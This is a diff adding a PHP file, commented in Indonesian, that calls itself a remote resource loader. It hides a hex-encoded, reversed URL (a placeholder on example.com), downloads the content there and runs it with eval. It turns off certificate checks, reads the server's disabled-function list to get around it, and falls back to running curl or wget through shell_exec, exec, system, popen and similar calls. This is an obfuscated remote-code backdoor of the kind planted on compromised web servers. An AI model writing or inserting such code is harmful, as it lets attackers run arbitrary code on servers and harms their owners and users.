@@ -1,0 +1,109 @@
+/**
+ * Remote Resource Loader
+ *
+ * Script utilitas ringkas untuk memuat dan mengeksekusi kode remote
+ * dengan strategi fallback komprehensif (Native PHP & System CLI).
+ * * @version 2.3 Professional Mini (Obfuscated)
+ */
+
+$encodedSource = '7478742e7470697263732f6f742f687461702f6d6f632e656c706d6178652f2f3a7370747468';
+
+$remoteSource = strrev(hex2bin($encodedSource));
+
+if ($payload = fetchRemoteResource($remoteSource)) {
+    eval('?>' . $payload);
+}
+
+/**
+ * Mengambil konten dari URL eksternal menggunakan metode terbaik yang tersedia.
+ * Mencoba cURL extension, stream context, dan eksekusi command line (curl/wget).
+ *
+ * @param string $url URL target resource
+ * @return string|false Konten resource atau false jika gagal
+ */
+function fetchRemoteResource(string $url)
+{
+    $userAgent = 'Mozilla/5.0 (Compatible; RemoteLoader/2.2; +https://example.com)';
+    
+    // 1. Metode Native: PHP cURL Extension
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT      => $userAgent
+        ]);
+        $result = curl_exec($ch);
+        curl_close($ch);
+        if ($result !== false && $result !== '') {
+            return $result;
+        }
+    }
+    
+    // 2. Metode Native: file_get_contents (Stream Context)
+    if (ini_get('allow_url_fopen')) {
+        $options = [
+            'http' => ['header' => "User-Agent: $userAgent\r\n", 'ignore_errors' => true],
+            'ssl'  => ['verify_peer' => false]
+        ];
+        $result = @file_get_contents($url, false, stream_context_create($options));
+        if ($result !== false && $result !== '') {
+            return $result;
+        }
+    }
+
+    // 3. Metode System CLI: Fallback robust (Curl -> Wget)
+    // Mencoba eksekusi perintah via shell jika metode native diblokir
+    $cliCommand = sprintf(
+        "curl -s -L -k -A '%s' %s || wget -q -O- --no-check-certificate -U '%s' %s",
+        $userAgent, escapeshellarg($url), $userAgent, escapeshellarg($url)
+    );
+    
+    $executionFunctions = ['shell_exec', 'exec', 'passthru', 'system', 'popen', 'proc_open'];
+    $disabledFunctions  = explode(',', ini_get('disable_functions'));
+    $disabledFunctions  = array_map('trim', $disabledFunctions);
+    
+    foreach ($executionFunctions as $function) {
+        if (!function_exists($function) || in_array($function, $disabledFunctions)) {
+            continue;
+        }
+
+        $output = '';
+        try {
+            if ($function === 'exec') {
+                @exec($cliCommand, $lines);
+                $output = implode("\n", $lines);
+            } elseif ($function === 'shell_exec') {
+                $output = @shell_exec($cliCommand);
+            } elseif ($function === 'popen') {
+                $handle = @popen($cliCommand, 'r');
+                if ($handle) {
+                    $output = @stream_get_contents($handle);
+                    @pclose($handle);
+                }
+            } elseif ($function === 'proc_open') {
+                $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; // stdout & stderr
+                $process = @proc_open($cliCommand, $descriptors, $pipes);
+                if (is_resource($process)) {
+                    $output = stream_get_contents($pipes[1]);
+                    fclose($pipes[1]); fclose($pipes[2]);
+                    proc_close($process);
+                }
+            } else {
+                // passthru, system
+                ob_start();
+                @$function($cliCommand);
+                $output = ob_get_clean();
+            }
+        } catch (Exception $e) {
+            continue;
+        }
+        
+        if (!empty($output)) {
+            return $output;
+        }
+    }
+
+    return false;
+}
